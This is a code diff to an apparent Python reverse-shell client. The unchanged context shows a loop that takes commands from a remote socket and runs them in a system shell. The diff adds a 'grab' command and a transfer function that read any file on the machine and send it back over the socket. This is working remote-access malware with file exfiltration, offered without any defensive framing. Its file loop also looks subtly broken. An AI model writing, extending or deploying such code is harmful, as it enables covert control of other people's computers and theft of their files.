@@ -2,6 +2,20 @@
 
 import socket
 import subprocess # CLI shell started on the system
+import os
+
+# transfer function
+def transfer(s,path):
+    if os.path.exists(path):
+        f = open(path, 'rb') # read in binary mode
+        packet = f.read(1024) # reading the sent file
+        while packet != "":
+            s.send(packet)
+            packet = f.read(1024)
+        s.send('DONE')
+        f.close()
+    else:
+        s.send('Unable to find out the file')
 
 def connect():
    # AF_INET as a pair of (host,port) | SOCK_STREAM (default mode)
@@ -15,6 +29,14 @@ def connect():
         if 'terminate' in command:
             s.close() # closing the socket if 'terminate'
             break
+        elif 'grab' in command:
+            # splitting information after the 'grab command'
+            grab,path = command.split(" -f ")
+            try:
+                # sendting the path to the transfer sub-routine
+                transfer(s,path)
+            except Exception as e:
+                s.send(str(e)) # sending error to the socket
         else:
             # piping the stdout the the subprocess module using the Shell
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
